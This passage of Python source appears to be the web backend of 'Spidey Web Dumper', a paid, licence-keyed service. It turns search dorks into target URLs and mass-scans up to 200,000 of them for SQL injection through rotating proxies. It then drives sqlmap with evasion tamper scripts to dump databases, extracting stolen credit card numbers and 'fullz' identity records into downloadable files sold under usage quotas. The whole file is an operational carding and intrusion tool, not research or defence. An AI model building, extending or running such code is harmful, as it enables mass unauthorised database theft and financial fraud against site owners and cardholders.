            update_progress(tid, msg="⛔ Cancelled")
            return
        
        dead_count = total - len(live_list)
        save_user_proxies(uid, live_list)
        save_proxy_stats(uid, live=len(live_list), dead=dead_count, total=total)
        save_last_response(uid, "proxy_check", {
            "checked": total, "live": len(live_list), "dead": dead_count
        })
        
        update_task(tid, status="done", result={
            "checked": total, "live": len(live_list), "dead": dead_count
        })
        update_progress(tid, done=total, total=total, live=len(live_list), msg="✅ Done!")
        add_log(tid, f"✅ Live: {len(live_list)}/{total} | Dead: {dead_count}")
        logger.info(f"[proxy_check:{tid}] FINISHED")
        
    except asyncio.CancelledError:
        add_log(tid, "⛔ Cancelled")
        update_progress(tid, msg="⛔ Cancelled")
    except Exception as e:
        logger.exception(f"[proxy_check:{tid}] ERROR")
        update_task(tid, status="error", error=str(e))
        add_log(tid, f"❌ Error: {str(e)[:200]}")
        
        
# ═══════════════════════════════════════════════════════════════════════════
#  API — PARSER
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/api/parser/run")
async def api_parser_run(request: Request, dorks: str = Form(...)):
    uid = require_user(request)
    dork_list = [d.strip() for d in dorks.splitlines() if d.strip()]
    if not dork_list:
        return JSONResponse({"error": "No dorks provided"}, status_code=400)
    if len(dork_list) > 200_000:
        dork_list = dork_list[:200_000]
    tid = new_task(uid, "parser", {"dorks": len(dork_list)})
    asyncio.create_task(_run_parser(tid, uid, dork_list))
    return {"task_id": tid}

async def _run_parser(tid: str, uid: str, dorks: List[str]):
    try:
        update_task(tid, status="running")
        update_progress(tid, msg=f"Parsing {len(dorks)} dorks...", total=len(dorks))
        proxies = get_user_proxies(uid)
        add_log(tid, f"Using {len(proxies)} proxies")
        from core.url_finder import search_urls_from_dorks
        last_edit = [0.0]
        async def on_prog(done, total, found, retries):
            now = time.time()
            if now - last_edit[0] < 1.5:
                return
            last_edit[0] = now
            update_progress(tid, done=done, total=total, found=found, msg=f"Scanned {done}/{total} | Found {found}")
        urls = await search_urls_from_dorks(dorks, limit=200_000, progress_callback=on_prog, proxy_list=proxies)
        ts = datetime.now().strftime("%d%m%y_%H%M%S")
        fname = save_output(uid, f"urls_{len(urls)}_{ts}.txt", "\n".join(urls))
        consume_quota(uid, "urls", len(urls))
        save_last_response(uid, "parser", {"dorks": len(dorks), "urls": len(urls), "file": fname})
        update_task(tid, status="done", result={"dorks": len(dorks), "urls": len(urls), "file": fname})
        update_progress(tid, done=len(dorks), total=len(dorks), found=len(urls), msg="✅ Done!")
    except Exception as e:
        logger.exception(f"[parser] {e}")
        update_task(tid, status="error", error=str(e))

# ═══════════════════════════════════════════════════════════════════════════
#  API — PROXY
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/api/proxy/add")
async def api_proxy_add(request: Request, proxies: str = Form("")):
    uid = require_user(request)
    if not proxies.strip():
        return JSONResponse({"error": "No proxies provided"}, status_code=400)
    from core.proxy import parse_proxy_text
    parsed = parse_proxy_text(proxies)
    if not parsed:
        return JSONResponse({"error": "No valid proxies parsed"}, status_code=400)
    current = get_user_proxies(uid)
    seen = set(current)
    added = 0
    for p in parsed:
        if p not in seen:
            seen.add(p); current.append(p); added += 1
    save_user_proxies(uid, current)
    save_last_response(uid, "proxy_add", {"added": added, "total": len(current)})
    return {"ok": True, "added": added, "duplicate": len(parsed) - added, "total": len(current)}

@app.post("/api/proxy/import")
async def api_proxy_import(request: Request, file: UploadFile = File(...)):
    uid = require_user(request)
    content = await file.read()
    fname = (file.filename or "").lower()
    from core.proxy import parse_proxy_text, parse_proxy_from_zip
    proxies = []
    if fname.endswith(".zip"):
        proxies = parse_proxy_from_zip(content)
    else:
        try:
            text = content.decode("utf-8", errors="ignore")
        except Exception:
            return JSONResponse({"error": "Cannot decode file"}, status_code=400)
        proxies = parse_proxy_text(text)
    if not proxies:
        return JSONResponse({"error": "No proxies in file"}, status_code=400)
    current = get_user_proxies(uid)
    seen = set(current)
    added = 0
    for p in proxies:
        if p not in seen:
            seen.add(p); current.append(p); added += 1
    save_user_proxies(uid, current)
    return {"ok": True, "added": added, "total": len(current)}

@app.post("/api/proxy/check")
async def api_proxy_check(request: Request):
    uid = require_user(request)
    proxies = get_user_proxies(uid)
    if not proxies:
        return JSONResponse({"error": "No proxies to check"}, status_code=400)
    
    logger.info(f"[proxy_check] User {uid} requested check of {len(proxies)} proxies")
    tid = new_task(uid, "proxy_check", {"total": len(proxies)})
    
    task = asyncio.create_task(_run_proxy_check(tid, uid, proxies))
    
    def _on_done(t):
        try:
            t.result()
        except Exception as e:
            logger.exception(f"[proxy_check] Task {tid} crashed")
            update_task(tid, status="error", error=f"Crash: {str(e)[:200]}")
    
    task.add_done_callback(_on_done)
    return {"task_id": tid}



@app.post("/api/proxy/clear")
async def api_proxy_clear(request: Request):
    uid = require_user(request)
    save_user_proxies(uid, [])
    save_proxy_stats(uid, 0, 0, 0)
    return {"ok": True, "total": 0}

@app.post("/api/proxy/remove")
async def api_proxy_remove(request: Request, proxies: str = Form(...)):
    uid = require_user(request)
    to_remove = set(p.strip() for p in proxies.splitlines() if p.strip())
    current = get_user_proxies(uid)
    new = [p for p in current if p not in to_remove]
    removed = len(current) - len(new)
    save_user_proxies(uid, new)
    return {"ok": True, "removed": removed, "total": len(new)}

@app.get("/api/proxy/list")
async def api_proxy_list(request: Request):
    uid = require_user(request)
    proxies = get_user_proxies(uid)
    stats = get_proxy_stats(uid)
    return {"ok": True, "proxies": proxies, "count": len(proxies), "stats": stats}

@app.get("/api/proxy/stats")
async def api_proxy_stats(request: Request):
    uid = require_user(request)
    return get_proxy_stats(uid)

# ═══════════════════════════════════════════════════════════════════════════
#  API — SQLI (MAIN FIX HERE)
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/api/sqli/scan")
async def api_sqli_scan(request: Request, urls: str = Form(...)):
    uid = require_user(request)
    
    # ✅ ROBUST PARSING
    raw = urls.replace("\r\n", "\n").replace("\r", "\n")
    raw_lines = raw.split("\n")
    
    url_list = []
    for line in raw_lines:
        u = line.strip().strip("\ufeff").strip()
        if not u:
            continue
        if not u.startswith(("http://", "https://")):
            if u.startswith(("www.", "http:/", "https:/")):
                if not u.startswith("http"):
                    u = "https://" + u.lstrip("/")
            else:
                continue
        url_list.append(u)
    
    # Dedupe
    seen = set()
    unique = []
    for u in url_list:
        if u not in seen:
            seen.add(u)
            unique.append(u)
    url_list = unique
    
    logger.info(f"[sqli] {len(raw_lines)} lines → {len(url_list)} valid URLs")
    
    if not url_list:
        return JSONResponse({"error": f"No valid URLs. Got {len(raw_lines)} lines"}, status_code=400)
    
    if len(url_list) > 200_000:
        url_list = url_list[:200_000]
    
    allowed, remaining = check_quota(uid, "sqli", len(url_list))
    if not allowed:
        return JSONResponse({"error": f"Quota exceeded. Remaining: {remaining}"}, status_code=429)
    
    tid = new_task(uid, "sqli", {"total": len(url_list)})
    logger.info(f"[sqli] Task {tid} created with {len(url_list)} URLs")
    
    task = asyncio.create_task(_run_sqli(tid, uid, url_list))
    
    def _on_done(t):
        try:
            t.result()
        except Exception as e:
            logger.exception(f"[sqli] Task {tid} crashed")
            update_task(tid, status="error", error=f"Crash: {str(e)[:200]}")
    
    task.add_done_callback(_on_done)
    return {"task_id": tid, "total": len(url_list)}


async def _run_sqli(tid: str, uid: str, urls: List[str]):
    """🎯 CLEAN SQLi Scanner"""
    try:
        total = len(urls)
        logger.info(f"[sqli:{tid}] STARTED with {total} URLs")
        
        update_task(tid, status="running")
        update_progress(tid, done=0, total=total, found=0, msg=f"Scanning {total} URLs...")
        add_log(tid, f"Testing {total} URLs")

        proxies = get_user_proxies(uid)
        add_log(tid, f"Using {len(proxies)} proxies")
        logger.info(f"[sqli:{tid}] Proxies: {len(proxies)}")

        if len(proxies) >= 5:
            add_log(tid, "⚡ Filtering live proxies...")
            update_progress(tid, msg="Filtering live proxies...")
            try:
                from core.proxy import check_proxies_bulk
                live = await check_proxies_bulk(proxies, timeout=5.0, concurrency=300)
                add_log(tid, f"✅ Live: {len(live)}/{len(proxies)}")
                proxies = live if live else []
            except Exception as e:
                logger.exception(f"[sqli:{tid}] Proxy filter failed")
                add_log(tid, f"⚠️ Filter failed: {str(e)[:60]}")
                proxies = []

        if not proxies:
            add_log(tid, "⚠️ No proxies — running direct")

        from core.sqli import check_urls_bulk
        last_edit = [time.time()]
        
        async def on_prog(done, tot, found):
            if is_cancelled(tid):
                return
            now = time.time()
            if now - last_edit[0] >= 1.0:
                last_edit[0] = now
                update_progress(tid, done=done, total=tot, found=found, msg=f"Tested {done}/{tot} | VULN {found}")
        
        update_progress(tid, msg=f"Scanning {total} URLs...")
        logger.info(f"[sqli:{tid}] Calling check_urls_bulk...")
        
        inj = await check_urls_bulk(
            urls, proxies=proxies, concurrency=80, timeout=6.0,
            progress_callback=on_prog, task_id=tid,
        )
        
        logger.info(f"[sqli:{tid}] Returned {len(inj)} vulnerable")
        
        if is_cancelled(tid):
            add_log(tid, "⛔ Cancelled")
            update_progress(tid, msg="⛔ Cancelled")
            return
        
        ts = datetime.now().strftime("%d%m%y_%H%M%S")
        fname = save_output(uid, f"vuln_{len(inj)}_{ts}.txt", "\n".join(inj))
        consume_quota(uid, "sqli", total)
        save_last_response(uid, "sqli", {"tested": total, "vuln": len(inj), "file": fname})
        update_task(tid, status="done", result={"tested": total, "vuln": len(inj), "file": fname})
        update_progress(tid, done=total, total=total, found=len(inj), msg="✅ Done!")
        add_log(tid, f"✅ Found {len(inj)} vulnerable URLs")
        logger.info(f"[sqli:{tid}] DONE — {len(inj)} vulns")
    except asyncio.CancelledError:
        add_log(tid, "⛔ Cancelled")
        update_progress(tid, msg="⛔ Cancelled")
    except Exception as e:
        logger.exception(f"[sqli:{tid}] ERROR")
        update_task(tid, status="error", error=str(e))
        add_log(tid, f"❌ Error: {str(e)[:200]}")

# ═══════════════════════════════════════════════════════════════════════════
#  API — DUMP
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/api/dump/run")
async def api_dump_run(request: Request, urls: str = Form(...), level: int = Form(3),
                       risk: int = Form(2), threads: int = Form(10),
                       technique: str = Form("BEUSTQ"),
                       tamper: str = Form("space2comment,between,charencode"),
                       crawl: int = Form(0)):
    uid = require_user(request)
    url_list = [u.strip() for u in urls.splitlines() if u.strip().startswith(("http://", "https://"))]
    if not url_list:
        return JSONResponse({"error": "No valid URLs"}, status_code=400)
    if len(url_list) > 5000:
        url_list = url_list[:5000]
    allowed, remaining = check_quota(uid, "dumps", len(url_list))
    if not allowed:
        return JSONResponse({"error": f"Quota exceeded. Remaining: {remaining}"}, status_code=429)
    level = max(1, min(5, level))
    risk = max(1, min(3, risk))
    threads = max(1, min(50, threads))
    crawl = max(0, min(5, crawl))
    tid = new_task(uid, "dump", {"total": len(url_list), "level": level, "risk": risk, "threads": threads})
    asyncio.create_task(_run_dump(tid, uid, url_list, level, risk, threads, technique, tamper, crawl))
    return {"task_id": tid}

async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, crawl):
    try:
        update_task(tid, status="running")
        update_progress(tid, total=len(urls), msg="Starting sqlmap...")
        proxies = get_user_proxies(uid)
        from core.sqlmap_api import api_dump_multiple
        from core.fullz import extract_fullz_from_dir, fullz_records_to_lines
        all_cards = set()
        all_fullz = []
        last_edit = [0.0]
        async def on_prog(done, total, success):
            now = time.time()
            if now - last_edit[0] < 1.5: return
            last_edit[0] = now
            update_progress(tid, done=done, total=total, cards=len(all_cards), fullz=len(all_fullz), msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}")
        async def on_result(r, zip_bytes):
            if r.cards:
                for c in r.cards: all_cards.add(c)
            try:
                src = r.csv_dir or ""
                if src and os.path.isdir(src):
                    recs = extract_fullz_from_dir(src)
                    if recs: all_fullz.extend(recs)
            except Exception: pass
            add_log(tid, f"✅ {r.url[:60]} | CC: {len(r.cards)}")
        await api_dump_multiple(urls, proxy_list=proxies, level=level, risk=risk, technique=technique, threads=threads, tamper=tamper, crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result)
        all_cards = list(all_cards)
        ts = datetime.now().strftime("%d%m%y_%H%M%S")
        result = {}
        if all_cards:
            cc_name = save_output(uid, f"cards_{len(all_cards)}_{ts}.txt", "\n".join(all_cards))
            result["cards_file"] = cc_name
            result["cards"] = len(all_cards)
            consume_quota(uid, "cards", len(all_cards))
        if all_fullz:
            seen = set(); dedup = []
            for rec in all_fullz:
                key = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
                if key in seen: continue
                seen.add(key); dedup.append(rec)
            rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
            if rich:
                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt", "\n".join(fullz_records_to_lines(rich, "full")))
                result["fullz_file"] = fz_name
                result["fullz"] = len(rich)
                consume_quota(uid, "fullz", len(rich))
        consume_quota(uid, "dumps", len(urls))
        save_last_response(uid, "dump", {"tested": len(urls), "cards": result.get("cards", 0), "fullz": result.get("fullz", 0), "cards_file": result.get("cards_file", ""), "fullz_file": result.get("fullz_file", "")})
        update_task(tid, status="done", result=result)
        update_progress(tid, done=len(urls), total=len(urls), cards=result.get("cards", 0), fullz=result.get("fullz", 0), msg="✅ Done!")
    except Exception as e:
        logger.exception(f"[dump] {e}")
        update_task(tid, status="error", error=str(e))

# ═══════════════════════════════════════════════════════════════════════════
#  API — TASK STATUS & CANCEL
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/api/task/{tid}")
async def api_task_status(request: Request, tid: str):
    uid = require_user(request)
    t = get_task(tid)
    if not t:
        raise HTTPException(status_code=404, detail="Task not found")
    if t["uid"] != uid:
        user = get_user(uid)
        if not user or not user.get("is_admin"):
            raise HTTPException(status_code=403, detail="Not your task")
    return t

@app.post("/api/task/{tid}/cancel")
async def api_task_cancel(request: Request, tid: str):
    uid = require_user(request)
    t = get_task(tid)
    if not t or t["uid"] != uid:
        raise HTTPException(status_code=404, detail="Task not found")
    update_task(tid, status="cancelled", error="Cancelled by user")
    update_progress(tid, msg="⛔ Cancelled")
    add_log(tid, "⛔ Cancelled by user")
    return {"ok": True}

@app.get("/api/tasks/active")
async def api_tasks_active(request: Request):
    uid = require_user(request)
    for tid, t in sorted(TASKS.items(), key=lambda x: x[1]["started"], reverse=True):
        if t["uid"] == uid and t["status"] in ("starting", "running"):
            return {"task_id": tid, "task": t}
    return {"task_id": None}

@app.get("/api/tasks/recent")
async def api_tasks_recent(request: Request):
    uid = require_user(request)
    user_tasks = [
        {"id": t["id"], "type": t["type"], "status": t["status"], "started": t["started"], "progress": t["progress"]}
        for t in TASKS.values() if t["uid"] == uid
    ]
    user_tasks.sort(key=lambda x: x["started"], reverse=True)
    return {"tasks": user_tasks[:20]}

# ═══════════════════════════════════════════════════════════════════════════
#  DOWNLOAD / FILES
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/download/{fname}")
async def download_file(request: Request, fname: str):
    uid = require_user(request)
    fname = safe_filename(fname)
    fpath = os.path.join(OUTPUT_DIR, fname)
    if not os.path.isfile(fpath):
        raise HTTPException(status_code=404, detail="File not found")
    user = get_user(uid)
    is_admin = user and user.get("is_admin")
    if not is_admin and not fname.startswith(uid[:8] + "_"):
        raise HTTPException(status_code=403, detail="Access denied")
    return FileResponse(fpath, filename=fname, media_type="text/plain")

@app.post("/api/files/delete")
async def api_files_delete(request: Request, fname: str = Form(...)):
    uid = require_user(request)
    user = get_user(uid)
    is_admin = user and user.get("is_admin")
    fname = safe_filename(fname)
    if not is_admin and not fname.startswith(uid[:8] + "_"):
        return JSONResponse({"error": "Access denied"}, status_code=403)
    fpath = os.path.join(OUTPUT_DIR, fname)
    if os.path.isfile(fpath):
        try:
            os.remove(fpath); return {"ok": True}
        except Exception as e:
            return JSONResponse({"error": str(e)}, status_code=500)
    return JSONResponse({"error": "Not found"}, status_code=404)

# ═══════════════════════════════════════════════════════════════════════════
#  SETTINGS
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/api/settings/password")
async def api_settings_password(request: Request, old_password: str = Form(...), new_password: str = Form(...)):
    uid = require_user(request)
    users = load_users()
    if uid not in users:
        return JSONResponse({"error": "User not found"}, status_code=404)
    if users[uid].get("password") != old_password:
        return JSONResponse({"error": "Old password wrong"}, status_code=400)
    ok, msg = check_strong_password(new_password)
    if not ok:
        return JSONResponse({"error": msg}, status_code=400)
    users[uid]["password"] = new_password
    save_users(users)
    return {"ok": True}

# ═══════════════════════════════════════════════════════════════════════════
#  ROUTES — ADMIN
# ═══════════════════════════════════════════════════════════════════════════
@app.get(ADMIN_PATH, response_class=HTMLResponse)
async def admin_panel(request: Request):
    uid = require_admin(request)
    users = load_users()
    keys = load_keys()
    active_users = sum(1 for u in users.values() if u.get("expires") and u.get("expires") > datetime.now().isoformat())
    return render("admin.html", {"request": request, "uid": uid, "total_users": len(users), "active_users": active_users, "total_keys": len(keys), "plans": PLANS})

@app.get(ADMIN_PATH + "/keys", response_class=HTMLResponse)
async def admin_keys(request: Request, msg: str = None):
    uid = require_admin(request)
    keys = load_keys()
    items = sorted(keys.items(), key=lambda x: x[1].get("created", ""), reverse=True)
    return render("admin_keys.html", {"request": request, "uid": uid, "keys": items, "msg": msg, "plans": PLANS})

@app.post(ADMIN_PATH + "/keys/generate")
async def admin_keys_generate(request: Request, plan: str = Form(...), count: int = Form(1)):
    uid = require_admin(request)
    if plan not in PLANS:
        return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Invalid+plan", status_code=302)
    count = max(1, min(100, count))
    keys = load_keys()
    for _ in range(count):
        k = generate_license_key()
        while k in keys: k = generate_license_key()
        keys[k] = {"plan": plan, "label": PLANS[plan]["label"], "created": datetime.now().isoformat(), "created_by": uid, "used_by": None}
    save_keys(keys)
    return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Generated+{count}+keys", status_code=302)

@app.post(ADMIN_PATH + "/keys/revoke")
async def admin_keys_revoke(request: Request, key: str = Form(...)):
    uid = require_admin(request)
    keys = load_keys()
    if key in keys:
        del keys[key]; save_keys(keys)
        return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Revoked", status_code=302)
    return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Not+found", status_code=302)

@app.get(ADMIN_PATH + "/users", response_class=HTMLResponse)
async def admin_users(request: Request, msg: str = None):
    uid = require_admin(request)
    users = load_users()
    items = sorted(users.items(), key=lambda x: x[1].get("created", ""), reverse=True)
    return render("admin_users.html", {"request": request, "uid": uid, "users": items, "msg": msg})

@app.post(ADMIN_PATH + "/users/delete")
async def admin_users_delete(request: Request, username: str = Form(...)):
    uid = require_admin(request)
    if username == ADMIN_USERNAME:
        return RedirectResponse(f"{ADMIN_PATH}/users?msg=Cannot+delete+admin", status_code=302)
    users = load_users()
    if username in users:
        del users[username]; save_users(users)
        return RedirectResponse(f"{ADMIN_PATH}/users?msg=Deleted", status_code=302)
    return RedirectResponse(f"{ADMIN_PATH}/users?msg=Not+found", status_code=302)

@app.post(ADMIN_PATH + "/users/extend")
async def admin_users_extend(request: Request, username: str = Form(...), plan: str = Form(...)):
    uid = require_admin(request)
    if plan not in PLANS:
        return RedirectResponse(f"{ADMIN_PATH}/users?msg=Invalid+plan", status_code=302)
    users = load_users()
    if username not in users:
        return RedirectResponse(f"{ADMIN_PATH}/users?msg=Not+found", status_code=302)
    plan_data = PLANS[plan]
    base = datetime.now()
    cur_exp = users[username].get("expires")
    if cur_exp:
        try:
            cur_dt = datetime.fromisoformat(cur_exp)
            if cur_dt > base: base = cur_dt
        except Exception: pass
    users[username]["expires"] = (base + plan_data["delta"]).isoformat()
    users[username]["plan"] = plan
    users[username]["plan_label"] = plan_data["label"]
    save_users(users)
    return RedirectResponse(f"{ADMIN_PATH}/users?msg=Extended", status_code=302)

@app.post(ADMIN_PATH + "/users/reset_password")
async def admin_users_reset(request: Request, username: str = Form(...), new_password: str = Form(...)):
    uid = require_admin(request)
    users = load_users()
    if username not in users:
        return RedirectResponse(f"{ADMIN_PATH}/users?msg=Not+found", status_code=302)
    ok, msg = check_strong_password(new_password)
    if not ok:
        return RedirectResponse(f"{ADMIN_PATH}/users?msg={msg.replace(' ','+')}", status_code=302)
    users[username]["password"] = new_password
    save_users(users)
    return RedirectResponse(f"{ADMIN_PATH}/users?msg=Password+reset", status_code=302)

@app.post(ADMIN_PATH + "/users/clear_usage")
async def admin_users_clear_usage(request: Request, username: str = Form(...)):
    uid = require_admin(request)
    users = load_users()
    if username not in users:
        return RedirectResponse(f"{ADMIN_PATH}/users?msg=Not+found", status_code=302)
    users[username]["usage"] = {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0}
    save_users(users)
    return RedirectResponse(f"{ADMIN_PATH}/users?msg=Usage+cleared", status_code=302)

@app.get(ADMIN_PATH + "/broadcast", response_class=HTMLResponse)
async def admin_broadcast_page(request: Request, msg: str = None):
    uid = require_admin(request)
    users = load_users()
    return render("admin_broadcast.html", {"request": request, "uid": uid, "total_users": len(users), "msg": msg})

@app.post(ADMIN_PATH + "/broadcast/send")
async def admin_broadcast_send(request: Request, subject: str = Form(...), message: str = Form(...)):
    uid = require_admin(request)
    bcast_file = os.path.join(DATA_DIR, "broadcast.json")
    _save_json(bcast_file, {"subject": subject, "message": message, "sent_at": datetime.now().isoformat(), "sent_by": uid})
    return RedirectResponse(f"{ADMIN_PATH}/broadcast?msg=Broadcast+sent", status_code=302)

@app.get(ADMIN_PATH + "/stats", response_class=HTMLResponse)
async def admin_stats(request: Request):
    uid = require_admin(request)
    users = load_users()
    keys = load_keys()
    try:
        import psutil
        proc = psutil.Process()
        mem_str = f"{proc.memory_info().rss / 1024 / 1024:.1f} MB"
        cpu_str = f"{psutil.cpu_percent(interval=0.1):.1f}%"
    except Exception:
        mem_str = "N/A"; cpu_str = "N/A"
    import platform
    stats = {
        "total_users": len(users),
        "active_users": sum(1 for u in users.values() if u.get("expires") and u.get("expires") > datetime.now().isoformat()),
        "total_keys": len(keys),
        "used_keys": sum(1 for k in keys.values() if k.get("used_by")),
        "free_keys": sum(1 for k in keys.values() if not k.get("used_by")),
        "active_tasks": len(TASKS),
        "mem": mem_str, "cpu": cpu_str,
        "python": platform.python_version(), "os": platform.system(),
        "locked_ips": len(LOCKED_IPS),
        "active_sessions": len(SESSIONS),
    }
    return render("admin_stats.html", {"request": request, "uid": uid, "stats": stats})

# ═══════════════════════════════════════════════════════════════════════════
#  STARTUP / SHUTDOWN
# ═══════════════════════════════════════════════════════════════════════════
@app.on_event("startup")
async def on_startup():
    logger.info("🕷️  Spidey Web Dumper starting...")
    logger.info(f"📁 Data dir: {DATA_DIR}")
    logger.info(f"📁 Output dir: {OUTPUT_DIR}")
    logger.info(f"🛡️  Admin path: {ADMIN_PATH}")
    load_users()
    load_keys()
    load_tasks_from_disk()
    try:
        from core.sqlmap_api import ensure_api_server
        asyncio.create_task(ensure_api_server())
        logger.info("🔧 sqlmapapi starting...")
    except Exception as e:
        logger.warning(f"sqlmapapi start failed: {e}")
    async def _cleaner():
        while True:
            await asyncio.sleep(600)
            try: cleanup_old_tasks(max_age_hours=24)
            except Exception: pass
    asyncio.create_task(_cleaner())
    logger.info("✅ Spidey Web Dumper ready")

@app.on_event("shutdown")
async def on_shutdown():
    logger.info("🕷️  Spidey shutting down...")
    try:
        save_tasks_to_disk()
    except Exception:
        pass
    try:
        from core.sqlmap_api import stop_api_server
        stop_api_server()
    except Exception: pass

@app.get("/health")
async def health():
    return {"status": "ok", "time": datetime.now().isoformat(), "tasks": len(TASKS)}

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    host = os.environ.get("HOST", "0.0.0.0")
    logger.info(f"🚀 Starting on {host}:{port}")
    uvicorn.run("web.main:app", host=host, port=port, reload=False, log_level="info")